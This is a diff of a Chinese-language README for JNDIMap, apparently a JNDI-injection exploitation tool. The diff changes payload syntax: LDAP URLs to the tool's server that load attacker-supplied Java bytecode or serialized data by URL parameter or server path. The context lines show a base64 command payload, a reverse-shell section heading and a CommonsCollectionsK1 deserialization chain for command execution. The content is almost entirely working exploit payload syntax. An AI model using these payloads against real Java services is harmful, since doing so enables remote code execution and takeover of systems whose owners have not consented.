@@ -75,8 +75,8 @@ ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 # 加载自定义 Class 字节码
 
 # URL 传参加载
-ldap://127.0.0.1:1389/Basic/FromCode/<base64-url-encoded-java-bytecode>
-# 从运行 JNDIMap 的服务器上加载字节码
+ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
+# 从运行 JNDIMap 的服务器上加载
 ldap://127.0.0.1:1389/Basic/FromPath/<base64-url-encoded-path-to-evil-class-file>
 
 # 原生反弹 Shell (支持 Windows)
@@ -326,7 +326,11 @@ JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
 
 ```bash
 # 自定义数据反序列化
-ldap://127.0.0.1:1389/Deserialize/<base64-url-encoded-serialize-data>
+
+# URL 传参加载
+ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialize-data>
+# 从运行 JNDIMap 的服务器上加载
+ldap://127.0.0.1:1389/Deserialize/FromPath/<base64-url-encoded-path-to-serialized-data>
 
 # CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
